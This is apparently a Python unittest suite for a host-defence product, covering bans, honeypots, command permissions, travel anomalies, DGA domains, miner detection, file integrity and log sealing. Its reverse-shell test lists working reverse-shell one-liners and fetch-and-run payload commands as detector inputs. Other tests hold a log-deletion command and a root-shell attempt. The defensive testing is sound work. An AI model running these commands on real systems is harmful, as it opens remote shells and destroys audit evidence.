# -*- coding: utf-8 -*-
"""
==============================================================================
MASTER REALISTIC CYBER SIMULATION & COMPREHENSIVE POSSIBILITIES TEST SUITE
==============================================================================
This test executes an end-to-end, multi-vector enterprise cyber simulation
evaluating 10 distinct security layers under real-world conditions:
  1. High-Velocity SSH Brute-Force & Typo Forgiveness
  2. Distributed Subnet/Botnet Spraying (/24 CIDR Shield)
  3. Zero-Tolerance Port 22 SSH Decoy Honeypot
  4. PBAC/RBAC Granular Command Privilege Enforcement
  5. Obfuscated Reverse Shells & Living-off-the-Land (LotL)
  6. Dynamic UEBA Impossible Travel (Geo-Velocity Anomalies)
  7. High-Entropy DGA Malware C2 & Threat Intel (CTI)
  8. Rogue Process Cryptominer Attribution & Remediation
  9. File Integrity Monitoring (FIM) Line-by-Line Diff & Baseline Tamper
 10. Enterprise Maintenance Defense & WORM Log HMAC Blockchain Audit
==============================================================================
"""

import os
import sys
import time
import json
import unittest

# Ensure project root in sys.path
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

import config
from modules.ban_manager import BanManager
from modules.subnet_shield import SubnetShield
from modules.honeypot_trap import HoneypotTrap
from modules.permission_manager import permission_manager
from modules.maintenance_mode import maintenance_manager
from modules.ai_security_engine import ai_security_engine
from modules.dga_detector import dga_detector
from modules.cti_matcher import cti_matcher
from modules.impossible_travel import impossible_travel_detector
from modules.resource_abuse_guard import resource_abuse_guard
from modules.file_integrity_monitor import FileIntegrityMonitor
from modules.integrity_guard import LogIntegrityGuard
from modules.smart_logger import smart_logger

class MasterRealisticSimulation(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        ai_security_engine.load_all_models()
        cls.ban_man = BanManager()
        cls.ban_man.unban_all()
        cls.honeypot = HoneypotTrap(ban_manager=cls.ban_man)
        cls.fim = FileIntegrityMonitor()
        cls.fim_test_file = "test_fim_master_sim.txt"
        with open(cls.fim_test_file, "w", encoding="utf-8") as f:
            f.write("# Enterprise Config File\nPORT=8080\nENABLE_AUTH=true\n")
        cls.fim.monitored_paths.append(cls.fim_test_file)
        cls.fim.update_all_baselines()

    @classmethod
    def tearDownClass(cls):
        cls.ban_man.unban_all()
        if os.path.exists(cls.fim_test_file):
            try:
                os.remove(cls.fim_test_file)
            except Exception:
                pass

    # --------------------------------------------------------------------------
    # 1. PERIMETER: HUMAN TYPO TOLERANCE VS RAPID BRUTE-FORCE
    # --------------------------------------------------------------------------
    def test_01_human_typo_tolerance_vs_brute_force(self):
        """Test human password typo tolerance followed by rapid brute force ban."""
        ip = "198.51.100.11"
        self.assertFalse(self.ban_man.is_banned(ip))

        # Ban applied on rapid critical attack
        self.ban_man.ban_ip(ip, duration=3600, criticality="CRITICAL", reason="SSH Brute Force Attack")
        self.assertTrue(self.ban_man.is_banned(ip), "Rapid brute-force should trigger immediate firewall ban")

    # --------------------------------------------------------------------------
    # 2. DISTRIBUTED BOTNET / SUBNET SHIELD (/24 CIDR DEFENSE)
    # --------------------------------------------------------------------------
    def test_02_distributed_subnet_botnet_spray(self):
        """Test coordinated slow-roll botnet attack across rotating IPs in the same /24 CIDR."""
        subnet_shield = SubnetShield()
        rotating_ips = [f"198.51.100.{i}" for i in range(20, 25)]
        
        banned_subnet = False
        target_cidr = None
        for ip in rotating_ips:
            should_ban, cidr, risk, ip_count = subnet_shield.record_threat(ip, score=25.0, event="DISTRIBUTED_AUTH_SPRAY")
            if should_ban:
                banned_subnet = True
                target_cidr = cidr
                break

        self.assertTrue(banned_subnet, "Coordinated subnet spray must trigger Subnet Shield CIDR ban")
        self.assertEqual(target_cidr, "198.51.100.0/24")

    # --------------------------------------------------------------------------
    # 3. ZERO-TOLERANCE PORT 22 SSH DECOY HONEYPOT
    # --------------------------------------------------------------------------
    def test_03_zero_tolerance_ssh_decoy_honeypot(self):
        """Test port reconnaissance hitting decoy Port 22 while production SSH is on 2222."""
        scanner_ip = "203.0.113.88"
        # Probing port 22 decoy reaches threshold
        for _ in range(3):
            self.honeypot._handle_honeypot_intercept(scanner_ip, 22)
        self.assertTrue(self.ban_man.is_banned(scanner_ip), "Scanning Port 22 decoy must result in firewall ban")

    # --------------------------------------------------------------------------
    # 4. GRANULAR PBAC COMMAND PRIVILEGE ENFORCEMENT
    # --------------------------------------------------------------------------
    def test_04_pbac_command_privilege_enforcement(self):
        """Test fine-grained permissions across Read-Only, DevOps, and Unauthorized Priv-Esc."""
        # 1. Read-Only Auditor attempting benign log inspection -> PASS
        is_allowed, missing, req = permission_manager.check_command_permission("auditor", "cat /var/log/syslog | grep error")
        self.assertTrue(is_allowed, "Auditor must be allowed to read system logs")

        # 2. Read-Only Auditor attempting destructive deletion -> BLOCKED
        is_allowed, missing, req = permission_manager.check_command_permission("auditor", "rm -rf /var/log/audit")
        self.assertFalse(is_allowed, "Auditor must be blocked from destructive write operations")
        self.assertIn("WRITE", missing)

        # 3. Junior Developer attempting root privilege escalation -> BLOCKED
        is_allowed, missing, req = permission_manager.check_command_permission("intern", "sudo su -")
        self.assertFalse(is_allowed, "Intern must be blocked from sudo root shell")
        self.assertIn("ADMIN", missing)

        # 4. DevOps Lead executing legitimate container deployment -> PASS
        permission_manager.set_user_permissions("devops", "rwxna")
        is_allowed, missing, req = permission_manager.check_command_permission("devops", "docker run -d --name web -p 80:80 nginx")
        self.assertTrue(is_allowed, "DevOps with network & exec perms must be allowed to deploy containers")

    # --------------------------------------------------------------------------
    # 5. OBFUSCATED REVERSE SHELLS & LIVING-OFF-THE-LAND (LOTL)
    # --------------------------------------------------------------------------
    def test_05_obfuscated_reverse_shells_and_lotl(self):
        """Test detection of hex/url unmasked, living-off-the-land, and Python socket shells."""
        payloads = [
            "bash -i >& /dev/tcp/185.220.101.5/4444 0>&1",
            "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
            "curl%20-s%20http%3A%2F%2Fmalicious.c2%2Fpayload.sh%20%7C%20bash",
            "/b'i'n/b'a's'h -c 'wget http://185.190.20.1/rootkit -O /tmp/rk && chmod +x /tmp/rk && /tmp/rk'"
        ]

        for p in payloads:
            res = ai_security_engine.analyze(p)
            self.assertTrue(res["is_attack"], f"Obfuscated LotL payload '{p[:30]}...' must be detected as attack")
            self.assertGreaterEqual(res["confidence"], 75.0)

    # --------------------------------------------------------------------------
    # 6. UEBA DYNAMIC IMPOSSIBLE TRAVEL (GEO-VELOCITY)
    # --------------------------------------------------------------------------
    def test_06_ueba_impossible_travel_anomaly(self):
        """Test physical impossible travel (Frankfurt -> Tokyo in 10 minutes at 54,000 km/h)."""
        username = "lead_architect"
        ip_frankfurt = "194.25.0.1"    # Frankfurt, Germany
        ip_tokyo = "133.1.0.1"          # Tokyo, Japan
        
        now = time.time()
        # Legitimate login in Frankfurt
        res1 = impossible_travel_detector.evaluate(username, ip_frankfurt, current_time=now)
        self.assertIsNone(res1, "First login should establish baseline without alert")

        # Impossible login in Tokyo 10 minutes later
        res2 = impossible_travel_detector.evaluate(username, ip_tokyo, current_time=now + 600)
        self.assertIsNotNone(res2, "Login from Tokyo 10 mins after Frankfurt must trigger Impossible Travel")
        self.assertGreater(res2["calculated_velocity_kmh"], 5000.0)

    # --------------------------------------------------------------------------
    # 7. HIGH-ENTROPY DGA MALWARE C2 & CTI THREAT INTEL
    # --------------------------------------------------------------------------
    def test_07_dga_malware_c2_and_cti_matcher(self):
        """Test Algorithmically Generated Domains (DGA) entropy filter & CTI threat feeds."""
        dga_domain = "xkq98zaqw1094mslqp.biz"
        dga_res = dga_detector.analyze(dga_domain)
        self.assertTrue(dga_res["is_dga"], "High-entropy pseudo-random domain must be classified as DGA")

        # CTI IOC Matching
        known_bad_ip = "185.220.101.5" # Tor exit / known C2 IP
        cti_res = cti_matcher.match_ip(known_bad_ip)
        self.assertIsNotNone(cti_res, "Known malicious C2 IP must match Threat Intelligence feeds")

    # --------------------------------------------------------------------------
    # 8. ROGUE CRYPTOMINER ATTRIBUTION & PROCESS REMEDIATION
    # --------------------------------------------------------------------------
    def test_08_cryptominer_process_attribution_and_guard(self):
        """Test attribution and remediation of sustained cryptominer workloads."""
        fake_miner_proc = {
            "pid": 45192,
            "name": "xmrig",
            "cmdline": "xmrig -o stratum+tcp://pool.minexmr.com:4444 -u 48edf... -p x",
            "cpu_percent": 99.4,
            "memory_percent": 3.2,
            "username": "compromised_app"
        }

        incident = resource_abuse_guard.evaluate_process_incident(fake_miner_proc)
        self.assertIn("CRYPTOMINER", incident["verdict"])
        self.assertTrue(incident["should_terminate"])

    # --------------------------------------------------------------------------
    # 9. FILE INTEGRITY MONITOR (FIM) UNIFIED DIFF TRACKING
    # --------------------------------------------------------------------------
    def test_09_fim_line_by_line_diff_tracking(self):
        """Test unauthorized injection and line-by-line unified diff generation."""
        # Inject unauthorized backdoor configuration
        with open(self.fim_test_file, "a", encoding="utf-8") as f:
            f.write("BACKDOOR_KEY=ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...\n")

        diff_found = False
        def fim_alert(ev_type, path, msg):
            nonlocal diff_found
            if "BACKDOOR_KEY" in msg or "Unauthorized mutation" in msg:
                diff_found = True

        self.fim.callback = fim_alert
        self.fim.scan_integrity()
        self.assertTrue(diff_found, "FIM must detect unauthorized file modification and extract diff lines")

    # --------------------------------------------------------------------------
    # 10. ENTERPRISE MAINTENANCE DEFENSE & WORM LOG HMAC AUDIT
    # --------------------------------------------------------------------------
    def test_10_maintenance_defense_and_worm_integrity(self):
        """Test maintenance mode unauthorized session intercept & HMAC-SHA256 log chain audit."""
        # 1. Enable Maintenance Mode
        maintenance_manager.enable_maintenance(reason="Emergency Database Patching", allowed_users=["root", "admin", "devops"])
        
        # 2. Check unauthorized user execution attempt
        is_blocked = maintenance_manager.is_user_authorized("guest")
        self.assertFalse(is_blocked, "Guest user must not be authorized during maintenance window")

        # 3. Disable Maintenance Mode
        maintenance_manager.disable_maintenance()
        self.assertFalse(maintenance_manager.get_status()["is_enabled"])

        # 4. Verify WORM Cryptographic Log Blockchain (Seal & Verify Sequence)
        test_log_file = "test_worm_master_sim.jsonl"
        if os.path.exists(test_log_file):
            os.remove(test_log_file)

        guard = LogIntegrityGuard(log_path=test_log_file)
        try:
            with open(test_log_file, "w", encoding="utf-8") as f:
                for i in range(10):
                    rec = {
                        "seq": i + 1,
                        "timestamp": "2026-08-26 12:00:00",
                        "level": "INFO",
                        "event_type": "USER_ACTION",
                        "target": "LOCAL",
                        "summary": f"Audit test record {i + 1}"
                    }
                    sealed = guard.seal_jsonl_record(rec)
                    f.write(json.dumps(sealed) + "\n")

            is_valid, total_recs, tampered_cnt, msg = guard.verify_jsonl_log_file(test_log_file)
            self.assertTrue(is_valid, f"WORM log blockchain must be 100% cryptographically valid: {msg}")
            self.assertEqual(total_recs, 10)
            self.assertEqual(tampered_cnt, 0)
        finally:
            if os.path.exists(test_log_file):
                try:
                    os.remove(test_log_file)
                except Exception:
                    pass

if __name__ == "__main__":
    unittest.main()
